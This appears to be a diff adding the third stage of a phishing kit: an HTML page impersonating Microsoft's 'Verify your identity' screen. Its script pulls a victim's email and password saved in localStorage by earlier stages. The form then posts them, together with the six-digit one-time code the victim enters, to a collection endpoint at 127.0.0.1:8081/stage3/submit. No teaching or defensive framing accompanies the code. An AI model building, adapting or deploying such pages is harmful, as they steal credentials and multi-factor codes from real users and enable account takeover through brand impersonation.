@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Microsoft - Verify Identity</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:#f2f2f2;font-family:'Segoe UI',Arial,sans-serif;}
+.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+.box{background:#fff;width:100%;max-width:440px;padding:44px 44px 32px;}
+.logo{margin-bottom:16px;}
+.title{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:10px;}
+.notice{background:#f0f6ff;border-left:3px solid #0067b8;padding:10px 12px;font-size:13px;color:#1b1b1b;margin-bottom:16px;line-height:1.6;}
+.otp-input{width:100%;padding:10px;border:1px solid #8a8886;font-size:26px;text-align:center;letter-spacing:14px;font-weight:600;outline:none;color:#1b1b1b;margin-bottom:8px;}
+.otp-input:focus{border:2px solid #0067b8;}
+.otp-input.err{border:2px solid #a4262c;}
+.errmsg{font-size:12px;color:#a4262c;margin-bottom:8px;display:none;align-items:center;gap:4px;}
+.errmsg.show{display:flex;}
+.link{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin:8px 0;cursor:pointer;}
+.divider{border:none;border-top:1px solid #e6e6e6;margin:14px 0;}
+.row{display:flex;justify-content:space-between;align-items:center;}
+.btn{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:14px;font-weight:600;cursor:pointer;}
+.btn:hover{background:#005a9e;}
+.btn-back{background:transparent;color:#0067b8;border:1px solid #0067b8;padding:8px 20px;font-size:14px;font-weight:600;cursor:pointer;}
+.footer{display:flex;gap:14px;margin-top:16px;}
+.footer a{font-size:11px;color:#605e5c;text-decoration:none;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="box">
+  <div class="logo">
+    <svg width="108" height="22" viewBox="0 0 108 22">
+      <rect x="0" y="0" width="9" height="9" fill="#F25022"/>
+      <rect x="10" y="0" width="9" height="9" fill="#7FBA00"/>
+      <rect x="0" y="10" width="9" height="9" fill="#00A4EF"/>
+      <rect x="10" y="10" width="9" height="9" fill="#FFB900"/>
+      <text x="24" y="16" font-family="Segoe UI,Arial" font-size="14" font-weight="600" fill="#1b1b1b">Microsoft</text>
+    </svg>
+  </div>
+  <div class="title">Verify your identity</div>
+  <div class="notice">
+    We sent a 6-digit code to <strong>+234 *** *** 4521</strong>.<br>
+    Enter the code below to complete sign-in.
+  </div>
+  <form method="POST" action="http://127.0.0.1:8081/stage3/submit">
+    <input type="hidden" name="email" id="h-email3"/>
+    <input type="hidden" name="password" id="h-pass3"/>
+    <input class="otp-input" type="text" name="otp" id="otp" maxlength="6" placeholder="______" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
+    <div class="errmsg" id="errmsg3">
+      <svg width="14" height="14" viewBox="0 0 14 14"><circle cx="7" cy="7" r="6" fill="#a4262c"/><path d="M7 4v3.5M7 9.2v.3" stroke="white" stroke-width="1.3" stroke-linecap="round"/></svg>
+      Enter a valid 6-digit code
+    </div>
+    <a class="link">I don't have this information</a>
+    <div class="divider"></div>
+    <div class="row">
+      <button type="button" class="btn-back" onclick="history.back()">Back</button>
+      <button type="button" class="btn" onclick="go3()">Verify</button>
+    </div>
+  </form>
+  <div class="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+  </div>
+</div>
+</div>
+<script>
+document.getElementById('h-email3').value = localStorage.getItem('ms_email') || '';
+document.getElementById('h-pass3').value = localStorage.getItem('ms_pass') || '';
+function go3(){
+  var otp=document.getElementById('otp').value.trim();
+  var err=document.getElementById('errmsg3');
+  var inp=document.getElementById('otp');
+  if(otp.length!==6){inp.classList.add('err');err.classList.add('show');return;}
+  inp.classList.remove('err');err.classList.remove('show');
+  document.querySelector('form').submit();
+}
+</script>
+</body>
+</html>
